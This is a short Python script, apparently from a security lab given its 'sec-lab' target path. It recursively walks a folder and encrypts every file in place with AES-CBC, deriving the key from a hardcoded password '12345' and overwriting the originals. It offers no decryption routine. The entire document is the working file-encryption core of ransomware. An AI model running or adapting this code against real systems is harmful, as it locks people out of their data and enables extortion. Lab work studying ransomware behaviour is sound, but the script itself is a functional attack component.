from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.padding import PKCS7
import os

PASSWORD = "12345"

def derive_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password)

def encrypt_file(file_path, password):
    salt = os.urandom(16)
    key = derive_key(password.encode(), salt)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    with open(file_path, 'rb') as file:
        data = file.read()

    padder = PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(file_path, 'wb') as enc_file:
        enc_file.write(salt + iv + encrypted_data)

    return f"File encrypted successfully: {file_path}"

if __name__ == "__main__":
    FOLDER_TO_PROCESS = "/home/sec-lab/Target Folder"
    for root, dirs, files in os.walk(FOLDER_TO_PROCESS):
        for file in files:
            encrypt_file(os.path.join(root, file), PASSWORD)
